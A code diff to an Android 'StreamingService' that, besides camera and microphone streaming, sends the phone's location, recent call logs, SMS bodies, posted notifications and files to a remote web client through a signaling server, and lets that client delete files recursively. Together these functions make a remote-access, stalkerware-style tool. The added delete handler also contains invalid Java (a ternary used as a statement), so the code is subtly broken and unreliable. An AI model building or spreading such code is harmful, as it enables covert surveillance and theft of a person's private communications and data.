@@ -674,36 +554,31 @@ public class StreamingService extends Service {
             @Override
             public void onCreateSuccess(SessionDescription sdp) {
                 Log.d(TAG, "Offer created");
-                String modifiedSdp = sdp.description
-                        .replace("a=sendrecv", "a=sendonly")
-                        .replace("a=recvonly", "a=sendonly");
-                SessionDescription modifiedSession =
-                        new SessionDescription(sdp.type, modifiedSdp);
+                String modified = applyBitrateConstraints(sdp.description);
+                SessionDescription modSdp = new SessionDescription(sdp.type, modified);
 
                 peerConnection.setLocalDescription(new SdpObserver() {
                     @Override public void onSetSuccess() {
                         try {
                             JSONObject signal = new JSONObject();
                             signal.put("type", "offer");
-                            signal.put("sdp",  modifiedSession.description);
+                            signal.put("sdp",  modSdp.description);
                             JSONObject msg = new JSONObject();
                             msg.put("to",     webClientId);
                             msg.put("from",   socket.id());
                             msg.put("signal", signal);
                             socket.emit("signal", msg);
-                            Log.d(TAG, "Sent offer to web client");
-                        } catch (JSONException e) {
-                            Log.e(TAG, "Offer send fail", e);
-                        }
+                            Log.d(TAG, "Offer sent to web client");
+                        } catch (JSONException e) { Log.e(TAG, "Offer send fail", e); }
                     }
-                    @Override public void onSetFailure(String err)      { Log.e(TAG, "Set local desc fail: " + err); }
+                    @Override public void onSetFailure(String e)      { Log.e(TAG, "Set local fail: " + e); }
                     @Override public void onCreateSuccess(SessionDescription s) {}
-                    @Override public void onCreateFailure(String f)     { Log.e(TAG, "Create offer fail(inner): " + f); }
-                }, modifiedSession);
+                    @Override public void onCreateFailure(String f)   { Log.e(TAG, "Create fail(inner): " + f); }
+                }, modSdp);
             }
-            @Override public void onSetSuccess()                        {}
-            @Override public void onCreateFailure(String err)           { Log.e(TAG, "Create offer fail: " + err); }
-            @Override public void onSetFailure(String err)              { Log.e(TAG, "Set desc fail: " + err); }
+            @Override public void onSetSuccess()               {}
+            @Override public void onCreateFailure(String err)  { Log.e(TAG, "Create offer fail: " + err); }
+            @Override public void onSetFailure(String err)     { Log.e(TAG, "Set desc fail: " + err); }
         }, mc);
     }
 
@@ -712,11 +587,13 @@ public class StreamingService extends Service {
             JSONObject signal = msg.getJSONObject("signal");
             String type = signal.optString("type", "");
             if ("answer".equals(type)) {
+                if (peerConnection == null) { Log.e(TAG, "No PC for answer"); return; }
                 SessionDescription ans = new SessionDescription(
                         SessionDescription.Type.ANSWER, signal.getString("sdp"));
                 peerConnection.setRemoteDescription(simpleSdpObserver, ans);
-                Log.d(TAG, "Processed answer from web client");
+                Log.d(TAG, "Processed answer");
             } else if (signal.has("candidate")) {
+                if (peerConnection == null) return;
                 JSONObject candidate = signal.getJSONObject("candidate");
                 IceCandidate c = new IceCandidate(
                         candidate.getString("sdpMid"),
@@ -737,165 +614,234 @@ public class StreamingService extends Service {
         @Override public void onSetFailure(String e)                { Log.e(TAG, "SDP set fail: " + e); }
     };
 
-    // ========================= FILE SYSTEM HANDLERS =========================
+    // ─────────────────────────────────────────────────────────────────────────
+    // Location
+    // ─────────────────────────────────────────────────────────────────────────
+    private void startLocationUpdatesIfAllowed() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+            Log.i(TAG, "Location permission not granted; skipping");
+            return;
+        }
+        LocationRequest req = LocationRequest.create();
+        req.setInterval(10_000);
+        req.setFastestInterval(5_000);
+        req.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+        locationCallback = new LocationCallback() {
+            @Override public void onLocationResult(LocationResult r) {
+                if (r == null) return;
+                for (android.location.Location loc : r.getLocations()) sendLocation(loc.getLatitude(), loc.getLongitude());
+            }
+        };
+        try {
+            fusedLocationClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper());
+            Log.d(TAG, "Location updates started");
+        } catch (SecurityException e) { Log.e(TAG, "Location start fail", e); }
+    }
 
+    private void sendLocation(double lat, double lng) {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        try {
+            JSONObject d = new JSONObject();
+            d.put("from", socket.id()); d.put("to", webClientId);
+            d.put("latitude", lat); d.put("longitude", lng);
+            socket.emit("location", d);
+        } catch (JSONException e) { Log.e(TAG, "Location send error", e); }
+    }
+
+    private void stopLocationUpdates() {
+        if (locationCallback != null && fusedLocationClient != null) {
+            fusedLocationClient.removeLocationUpdates(locationCallback);
+            locationCallback = null;
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // Data polling
+    // ─────────────────────────────────────────────────────────────────────────
+    private void startDataPollingIfAllowed() {
+        boolean canCall = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
+        boolean canSms  = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)      == PackageManager.PERMISSION_GRANTED;
+        if (!canCall || !canSms) { Log.i(TAG, "Call/SMS permission not granted; skip polling"); return; }
+        dataHandler  = new Handler(Looper.getMainLooper());
+        dataRunnable = new Runnable() {
+            @Override public void run() {
+                sendCallLogs();
+                sendSmsMessages();
+                if (dataHandler != null) dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
+            }
+        };
+        dataHandler.post(dataRunnable);
+    }
+
+    private void sendCallLogs() {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        try {
+            ContentResolver resolver = getContentResolver();
+            Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI,
+                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
+                    null, null, CallLog.Calls.DATE + " DESC");
+            if (cursor == null) return;
+            JSONArray arr = new JSONArray();
+            int cnt = 0;
+            while (cursor.moveToNext() && cnt < 10) {
+                JSONObject c = new JSONObject();
+                c.put("number",   cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                c.put("type",     getCallTypeString(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
+                c.put("date",     new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))));
+                c.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                arr.put(c); cnt++;
+            }
+            cursor.close();
+            JSONObject msg = new JSONObject();
+            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("call_logs", arr);
+            socket.emit("call_log", msg);
+        } catch (Exception e) { Log.e(TAG, "Error sending call logs", e); }
+    }
+
+    private void sendSmsMessages() {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        try {
+            ContentResolver resolver = getContentResolver();
+            Cursor cursor = resolver.query(Telephony.Sms.CONTENT_URI,
+                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
+                    null, null, Telephony.Sms.DATE + " DESC");
+            if (cursor == null) return;
+            JSONArray arr = new JSONArray();
+            int cnt = 0;
+            while (cursor.moveToNext() && cnt < 50) {
+                JSONObject s = new JSONObject();
+                s.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
+                s.put("body",    cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
+                s.put("date",    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
+                s.put("type",    getSmsTypeString(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
+                arr.put(s); cnt++;
+            }
+            cursor.close();
+            JSONObject msg = new JSONObject();
+            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("sms_messages", arr);
+            socket.emit("sms", msg);
+        } catch (Exception e) { Log.e(TAG, "Error sending SMS", e); }
+    }
+
+    private String getCallTypeString(int t) {
+        switch (t) {
+            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
+            case CallLog.Calls.MISSED_TYPE:   return "Missed";
+            default:                          return "Unknown";
+        }
+    }
+
+    private String getSmsTypeString(int t) {
+        switch (t) {
+            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Received";
+            case Telephony.Sms.MESSAGE_TYPE_SENT:  return "Sent";
+            default:                               return "Unknown";
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // File System
+    // ─────────────────────────────────────────────────────────────────────────
     private void handleFsList(JSONObject data) {
         String path = data.optString("path", "/storage/emulated/0/");
-        Log.d(TAG, "FS List requested for: " + path);
-
         File dir = new File(path);
         JSONArray filesArray = new JSONArray();
-
         if (dir.exists() && dir.isDirectory()) {
             File[] files = dir.listFiles();
             if (files != null) {
                 for (File f : files) {
                     try {
-                        JSONObject fileObj = new JSONObject();
-                        fileObj.put("name",         f.getName());
-                        fileObj.put("path",         f.getAbsolutePath());
-                        fileObj.put("isDir",        f.isDirectory());
-                        fileObj.put("size",         f.isDirectory() ? 0 : f.length());
-                        fileObj.put("lastModified", f.lastModified());
-                        filesArray.put(fileObj);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                    }
+                        JSONObject obj = new JSONObject();
+                        obj.put("name", f.getName()); obj.put("path", f.getAbsolutePath());
+                        obj.put("isDir", f.isDirectory()); obj.put("size", f.isDirectory() ? 0 : f.length());
+                        obj.put("lastModified", f.lastModified());
+                        filesArray.put(obj);
+                    } catch (JSONException e) { e.printStackTrace(); }
                 }
             }
         }
-
         try {
             JSONObject response = new JSONObject();
-            response.put("currentPath", path);
-            response.put("files",       filesArray);
-
+            response.put("currentPath", path); response.put("files", filesArray);
             JSONObject msg = new JSONObject();
-            msg.put("to",        webClientId);
-            msg.put("from",      socket.id());
-            msg.put("file_list", response);
-
+            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("file_list", response);
             socket.emit("fs:files", msg);
-            Log.d(TAG, "Sent file list for " + path);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error sending file list", e);
-        }
+        } catch (JSONException e) { Log.e(TAG, "Error sending file list", e); }
     }
 
     private void handleFsDownload(JSONObject data) {
         String path = data.optString("path", "");
         if (path.isEmpty() || webClientId == null) return;
-
-        Log.d(TAG, "FS Download requested for: " + path);
         File file = new File(path);
+        if (!file.exists() || !file.isFile()) return;
+        new Thread(() -> {
+            try {
+                String fileId      = java.util.UUID.randomUUID().toString();
+                long   fileSize    = file.length();
+                int    chunkSize   = 64 * 1024;
+                int    totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
+                JSONObject startMsg = new JSONObject();
+                startMsg.put("to", webClientId); startMsg.put("from", socket.id());
+                startMsg.put("fileId", fileId); startMsg.put("name", file.getName());
+                startMsg.put("size", fileSize); startMsg.put("totalChunks", totalChunks);
+                socket.emit("fs:download_start", startMsg);
 
-        if (file.exists() && file.isFile()) {
-            new Thread(() -> {
-                try {
-                    String fileId     = java.util.UUID.randomUUID().toString();
-                    long   fileSize   = file.length();
-                    int    chunkSize  = 64 * 1024; // 64 KB
-                    int    totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
-
-                    // 1. Send start event
-                    JSONObject startMsg = new JSONObject();
-                    startMsg.put("to",          webClientId);
-                    startMsg.put("from",        socket.id());
-                    startMsg.put("fileId",      fileId);
-                    startMsg.put("name",        file.getName());
-                    startMsg.put("size",        fileSize);
-                    startMsg.put("totalChunks", totalChunks);
-                    socket.emit("fs:download_start", startMsg);
-                    Log.d(TAG, "Starting chunked download: " + file.getName() + " id=" + fileId);
-
-                    // 2. Stream chunks
-                    FileInputStream fis   = new FileInputStream(file);
-                    byte[]          buffer    = new byte[chunkSize];
-                    int             bytesRead;
-                    int             chunkIndex = 0;
-
-                    while ((bytesRead = fis.read(buffer)) != -1) {
-                        if (!socket.connected()) {
-                            Log.w(TAG, "Socket disconnected during download");
-                            break;
-                        }
-                        String base64Chunk = Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP);
-                        JSONObject chunkMsg = new JSONObject();
-                        chunkMsg.put("to",         webClientId);
-                        chunkMsg.put("from",       socket.id());
-                        chunkMsg.put("fileId",     fileId);
-                        chunkMsg.put("chunkIndex", chunkIndex);
-                        chunkMsg.put("content",    base64Chunk);
-                        socket.emit("fs:download_chunk", chunkMsg);
-                        chunkIndex++;
-                        Thread.sleep(50); // avoid flooding
-                    }
-                    fis.close();
-
-                    // 3. Send complete event
-                    JSONObject completeMsg = new JSONObject();
-                    completeMsg.put("to",     webClientId);
-                    completeMsg.put("from",   socket.id());
-                    completeMsg.put("fileId", fileId);
-                    socket.emit("fs:download_complete", completeMsg);
-                    Log.d(TAG, "Completed chunked download: " + file.getName());
-
-                } catch (Exception e) {
-                    Log.e(TAG, "Error downloading file (chunked)", e);
-                    try {
-                        JSONObject errorMsg = new JSONObject();
-                        errorMsg.put("to",    webClientId);
-                        errorMsg.put("from",  socket.id());
-                        errorMsg.put("error", e.getMessage());
-                        socket.emit("fs:download_error", errorMsg);
-                    } catch (JSONException ignore) {}
+                FileInputStream fis = new FileInputStream(file);
+                byte[] buf = new byte[chunkSize]; int read; int idx = 0;
+                while ((read = fis.read(buf)) != -1) {
+                    if (!socket.connected()) break;
+                    JSONObject chunk = new JSONObject();
+                    chunk.put("to", webClientId); chunk.put("from", socket.id());
+                    chunk.put("fileId", fileId); chunk.put("chunkIndex", idx);
+                    chunk.put("content", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP));
+                    socket.emit("fs:download_chunk", chunk);
+                    idx++; Thread.sleep(50);
                 }
-            }).start();
-        }
+                fis.close();
+                JSONObject done = new JSONObject();
+                done.put("to", webClientId); done.put("from", socket.id()); done.put("fileId", fileId);
+                socket.emit("fs:download_complete", done);
+            } catch (Exception e) {
+                Log.e(TAG, "Download error", e);
+                try {
+                    JSONObject err = new JSONObject();
+                    err.put("to", webClientId); err.put("from", socket.id()); err.put("error", e.getMessage());
+                    socket.emit("fs:download_error", err);
+                } catch (JSONException ignore) {}
+            }
+        }).start();
     }
 
     private void handleFsDelete(JSONObject data) {
         String path = data.optString("path", "");
         if (path.isEmpty()) return;
-
-        Log.d(TAG, "FS Delete requested for: " + path);
         File file = new File(path);
-        boolean deleted = false;
-
-        if (file.exists()) {
-            deleted = file.isDirectory() ? deleteRecursive(file) : file.delete();
-        }
-        Log.d(TAG, "File deleted: " + deleted);
+        if (file.exists()) file.isDirectory() ? deleteRecursive(file) : file.delete();
     }
 
-    private boolean deleteRecursive(File fileOrDirectory) {
-        if (fileOrDirectory.isDirectory()) {
-            File[] children = fileOrDirectory.listFiles();
-            if (children != null) {
-                for (File child : children) deleteRecursive(child);
-            }
-        }
-        return fileOrDirectory.delete();
+    private boolean deleteRecursive(File f) {
+        if (f.isDirectory()) { File[] ch = f.listFiles(); if (ch != null) for (File c : ch) deleteRecursive(c); }
+        return f.delete();
     }
 
-    // ========================= NOTIFICATION =========================
-
+    // ─────────────────────────────────────────────────────────────────────────
+    // Notification
+    // ─────────────────────────────────────────────────────────────────────────
     private Notification createNotification() {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
             ch.setDescription("Camera & microphone streaming");
             nm.createNotificationChannel(ch);
         }
         Intent stop = new Intent(this, StreamingService.class);
         stop.setAction("STOP_STREAMING");
-        PendingIntent stopPI = PendingIntent.getService(
-                this, 0, stop,
+        PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
                 (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                         ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                         : PendingIntent.FLAG_UPDATE_CURRENT);
-
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Streaming Active")
                 .setContentText("Camera and microphone streaming is running")
@@ -905,51 +851,39 @@ public class StreamingService extends Service {
                 .build();
     }
 
-    // ========================= CLEANUP =========================
-
+    // ─────────────────────────────────────────────────────────────────────────
+    // Cleanup
+    // ─────────────────────────────────────────────────────────────────────────
     private void cleanup() {
         stopLocationUpdates();
+        // Disable torch if on
+        if (torchOn) setTorch(false);
         if (frontCapturer != null) {
             try { frontCapturer.stopCapture(); } catch (InterruptedException ignored) {}
-            frontCapturer.dispose();
-            frontCapturer = null;
+            frontCapturer.dispose(); frontCapturer = null;
         }
         if (backCapturer != null) {
             try { backCapturer.stopCapture(); } catch (InterruptedException ignored) {}
-            backCapturer = null;
+            backCapturer.dispose(); backCapturer = null;
         }
-        if (frontSource   != null) { frontSource.dispose();  frontSource = null; }
-        if (backSource    != null) { backSource.dispose();   backSource  = null; }
-        if (audioSource   != null) { audioSource.dispose();  audioSource = null; }
+        if (frontSource  != null) { frontSource.dispose();  frontSource  = null; }
+        if (backSource   != null) { backSource.dispose();   backSource   = null; }
+        if (audioSource  != null) { audioSource.dispose();  audioSource  = null; }
         if (peerConnection != null) { peerConnection.close(); peerConnection = null; }
-        if (frontHelper   != null) { frontHelper.dispose();  frontHelper = null; }
-        if (backHelper    != null) { backHelper.dispose();   backHelper  = null; }
-        if (eglBase       != null) { eglBase.release();      eglBase     = null; }
-        if (factory       != null) { factory.dispose();      factory     = null; }
-        if (dataHandler != null && dataRunnable != null) {
+        if (frontHelper  != null) { frontHelper.dispose();  frontHelper  = null; }
+        if (backHelper   != null) { backHelper.dispose();   backHelper   = null; }
+        if (eglBase      != null) { eglBase.release();      eglBase      = null; }
+        if (factory      != null) { factory.dispose();      factory      = null; }
+        if (dataHandler  != null && dataRunnable != null) {
             dataHandler.removeCallbacks(dataRunnable);
-            dataHandler  = null;
-            dataRunnable = null;
+            dataHandler = null; dataRunnable = null;
         }
+        reconnectHandler.removeCallbacksAndMessages(null);
     }
 
-    // ========================= NOTIFICATION LISTENER =========================
-
-    /**
-     * Declare in AndroidManifest:
-     *
-     * <service
-     *   android:name=".StreamingService$NotificationListener"
-     *   android:label="Notification Listener"
-     *   android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-     *   android:exported="true">
-     *   <intent-filter>
-     *     <action android:name="android.service.notification.NotificationListenerService"/>
-     *   </intent-filter>
-     * </service>
-     *
-     * User must also enable it in Settings > Notifications > Notification access.
-     */
+    // ─────────────────────────────────────────────────────────────────────────
+    // Notification Listener
+    // ─────────────────────────────────────────────────────────────────────────
     public static class NotificationListener extends NotificationListenerService {
         private Socket socket;
         private String webClientId;
@@ -963,74 +897,53 @@ public class StreamingService extends Service {
         private void connectSignaling() {
             try {
                 IO.Options opts = new IO.Options();
-                opts.transports = new String[]{"websocket"};
+                opts.transports           = new String[]{"websocket"};
+                opts.reconnection         = true;
+                opts.reconnectionAttempts = Integer.MAX_VALUE;
+                opts.reconnectionDelay    = 3000;
                 String signalingUrl = SettingsRepository.getSignalingUrl(this);
                 socket = IO.socket(signalingUrl, opts);
-
                 socket.on(Socket.EVENT_CONNECT, args -> {
-                    Log.d(TAG, "NotificationListener Socket.IO CONNECTED");
+                    Log.d(TAG, "NotificationListener connected");
                     socket.emit("identify", "android");
                 }).on("web-client-ready", args -> {
                     if (args[0] instanceof String) {
                         webClientId = (String) args[0];
-                        Log.d(TAG, "NotificationListener Web client ready: " + webClientId);
                         sendActiveNotifications();
                     }
                 }).on(Socket.EVENT_CONNECT_ERROR, args -> {
-                    Log.e(TAG, "NotificationListener Connect error: " + Arrays.toString(args));
+                    Log.e(TAG, "NotificationListener connect error: " + Arrays.toString(args));
                 });
                 socket.connect();
-            } catch (URISyntaxException e) {
-                Log.e(TAG, "NotificationListener Bad signaling URL", e);
-            }
+            } catch (URISyntaxException e) { Log.e(TAG, "NotificationListener bad URL", e); }
         }
 
         private void sendActiveNotifications() {
             try {
                 StatusBarNotification[] active = getActiveNotifications();
-                if (active != null) {
-                    for (StatusBarNotification sbn : active) onNotificationPosted(sbn);
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error sending active notifications", e);
-            }
+                if (active != null) for (StatusBarNotification sbn : active) onNotificationPosted(sbn);
+            } catch (Exception e) { Log.e(TAG, "Error sending active notifications", e); }
         }
 
         @Override
         public void onNotificationPosted(StatusBarNotification sbn) {
-            if (webClientId == null || socket == null || !socket.connected()) {
-                Log.w(TAG, "Cannot send notification, no web client or socket disconnected");
-                return;
-            }
+            if (webClientId == null || socket == null || !socket.connected()) return;
             try {
-                Notification notification = sbn.getNotification();
-                String appName   = sbn.getPackageName();
-                String title     = notification.extras.getString(Notification.EXTRA_TITLE, "No Title");
-                String text      = notification.extras.getString(Notification.EXTRA_TEXT,  "No Text");
-                String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime()));
-
-                JSONObject notificationData = new JSONObject();
-                notificationData.put("appName",   appName);
-                notificationData.put("title",     title);
-                notificationData.put("text",      text);
-                notificationData.put("timestamp", timestamp);
-
+                Notification n = sbn.getNotification();
+                JSONObject d = new JSONObject();
+                d.put("appName",   sbn.getPackageName());
+                d.put("title",     n.extras.getString(Notification.EXTRA_TITLE, "No Title"));
+                d.put("text",      n.extras.getString(Notification.EXTRA_TEXT,  "No Text"));
+                d.put("timestamp", new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime())));
                 JSONObject msg = new JSONObject();
-                msg.put("to",           webClientId);
-                msg.put("from",         socket.id());
-                msg.put("notification", notificationData);
-
+                msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("notification", d);
                 socket.emit("notification", msg);
-                Log.d(TAG, "Sent notification: " + notificationData);
-            } catch (JSONException e) {
-                Log.e(TAG, "Error sending notification", e);
-            }
+            } catch (JSONException e) { Log.e(TAG, "Error sending notification", e); }
         }
 
         @Override public void onDestroy() {
             super.onDestroy();
             if (socket != null) { socket.disconnect(); socket = null; }
-            Log.d(TAG, "NotificationListener onDestroy");
         }
     }
 }
